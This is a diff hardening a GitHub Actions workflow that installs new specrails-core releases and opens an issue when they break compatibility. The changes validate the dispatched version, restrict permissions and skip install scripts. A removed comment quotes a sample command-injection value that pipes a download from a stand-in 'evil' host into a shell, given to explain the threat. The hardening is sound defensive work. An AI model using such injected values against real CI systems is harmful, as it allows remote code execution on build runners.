@@ -5,54 +5,73 @@ on:
     types: [specrails-core-released]
 
 permissions:
-  issues: write
+  contents: read
+
+concurrency:
+  group: core-contract-${{ github.event.client_payload.core_version }}
+  cancel-in-progress: false
 
 jobs:
   check-compat:
     runs-on: ubuntu-latest
+    timeout-minutes: 15
+    outputs:
+      drift: ${{ steps.compat.outputs.drift }}
+      version: ${{ steps.version.outputs.version }}
     steps:
       - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
-
+        with:
+          persist-credentials: false
       - uses: actions/setup-node@53b83947a5a98c8d113130e565377fae1a50d02f  # v6.3.0
         with:
-          node-version: 20
-
-      - name: Install dependencies
-        run: npm ci
-
-      - name: Install specrails-core
-        # M4: the repository_dispatch client_payload is attacker-influenced if the
-        # cross-repo dispatch token ever leaks. Pass it through an env var (never
-        # interpolated into the shell command) and validate it against a strict
-        # semver regex before use, so a value like "1.0.0; curl evil | sh" cannot
-        # achieve command execution on the runner.
+          node-version: 22.22.3
+          cache: npm
+      - name: Validate the dispatched version before using it
+        id: version
         env:
           CORE_VERSION: ${{ github.event.client_payload.core_version }}
-        run: |
-          if ! printf '%s' "$CORE_VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
-            echo "Refusing to install: invalid core_version '$CORE_VERSION'"
-            exit 1
-          fi
-          npm install -g "specrails-core@${CORE_VERSION}"
+        run: node scripts/release-policy.mjs core-version
+      - name: Install Desktop dependencies
+        run: npm ci
+      - name: Install the exact Core candidate without running its scripts
+        env:
+          CORE_VERSION: ${{ steps.version.outputs.version }}
+        run: >-
+          npm install --prefix "$RUNNER_TEMP/specrails-core-check"
+          --ignore-scripts --no-audit --no-fund --package-lock=false --no-save
+          "specrails-core@$CORE_VERSION"
+      - name: Require and compare this candidate's integration contract
+        id: compat
+        env:
+          CORE_VERSION: ${{ steps.version.outputs.version }}
+          CORE_PACKAGE_ROOT: ${{ runner.temp }}/specrails-core-check/node_modules/specrails-core
+        run: node --import tsx scripts/check-core-sync.mjs
 
-      - name: Run compat check
-        run: npx tsx scripts/check-core-compat.ts
-
-      - name: Open issue on drift
-        if: failure()
+  report-drift:
+    needs: check-compat
+    if: always() && needs.check-compat.outputs.drift == 'true'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    permissions:
+      issues: write
+    steps:
+      - name: Open one issue per incompatible version
         uses: actions/github-script@ed597411d8f924073f98dfc5c65a23a2325f34cd  # v8.0.0
         env:
-          CORE_VERSION: ${{ github.event.client_payload.core_version }}
+          CORE_VERSION: ${{ needs.check-compat.outputs.version }}
         with:
-          # M4: read the payload from process.env (a JS string) instead of `${{ }}`
-          # interpolation, which would let a value with a quote break out of the
-          # script literal.
           script: |
-            const coreVersion = process.env.CORE_VERSION || 'unknown'
+            const coreVersion = process.env.CORE_VERSION
+            const title = `core-sync-required: specrails-core ${coreVersion} has breaking changes`
+            const issues = await github.paginate(github.rest.issues.listForRepo, {
+              ...context.repo, state: 'open', labels: 'core-sync-required', per_page: 100
+            })
+            if (issues.some(issue => issue.title === title)) {
+              core.info(`An open compatibility issue already exists for ${coreVersion}.`)
+              return
+            }
             await github.rest.issues.create({
-              owner: context.repo.owner,
-              repo: context.repo.repo,
-              title: `core-sync-required: specrails-core ${coreVersion} has breaking changes`,
-              body: 'The `sync-core-contract` workflow detected drift between specrails-core and specrails-desktop.\n\nRun `npx tsx scripts/check-core-compat.ts` locally after installing the new core version to see the full diff.',
+              ...context.repo, title,
+              body: `The explicit specrails-core ${coreVersion} candidate failed the Desktop contract check.\n\nSee the exact mismatch in [workflow run ${context.runId}](https://github.com/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}). Installation, registry and invalid-input failures do not create this issue.`,
               labels: ['core-sync-required']
             })
